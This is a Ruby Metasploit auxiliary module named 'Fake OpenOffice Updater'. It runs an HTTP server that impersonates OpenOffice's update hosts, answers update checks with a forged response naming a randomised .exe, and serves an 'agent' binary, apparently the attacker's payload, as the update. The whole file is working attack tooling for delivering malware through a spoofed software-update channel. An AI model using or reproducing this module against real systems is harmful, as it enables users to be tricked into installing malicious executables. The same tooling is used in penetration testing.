require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake OpenOffice Updater',
			'Version'     => '1.0',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
			], self.class)

		@base = {
			'vh' => ['update.services.openoffice.org', 'update23.services.openoffice.org'],
			'request' => [{
				'req' => 'ProductUpdateService/check.Update', 
				'type' => 'string', 
				'method' => '', 
				'bin'    => '0',
				'string' => "yes\$\$\$http://update.services.openoffice.org/openofficeupdate<%RND1%>.exe\$\$\$buildid=<%VERSION%>\nProductPatch=null\nProductSource=<%SOURCE%>\nProductKey=OpenOffice.org <%VERSION%>\nAllLanguages=es\n_OS=Windows\n_ARCH=x86\n",
				'parse' => 1,
				'file' => '',
			},
			{
				'req' => '.exe', 
				'type' => 'agent', 
				'method' => '', 
				'bin'    => 1,		    
				'string' => '',
				'parse' => '0',
				'file' => ''
			}
			],
			'options' => {  
				'version'  => { 
					'val' => '"9#{RndNum(3)}"',
					'hidden' => 1,
					'dynamic' =>1,
				},
				'source'  => { 
					'val' => '"OO#{RndAlpha(4)}"',
					'hidden' => 1,
					'dynamic' =>1,
				},
				'rnd1'  => { 
					'val' => 'RndAlpha(RndNum(1))',
					'hidden' => 1,
					'dynamic' =>1,
				}
			}
		}
	end
end
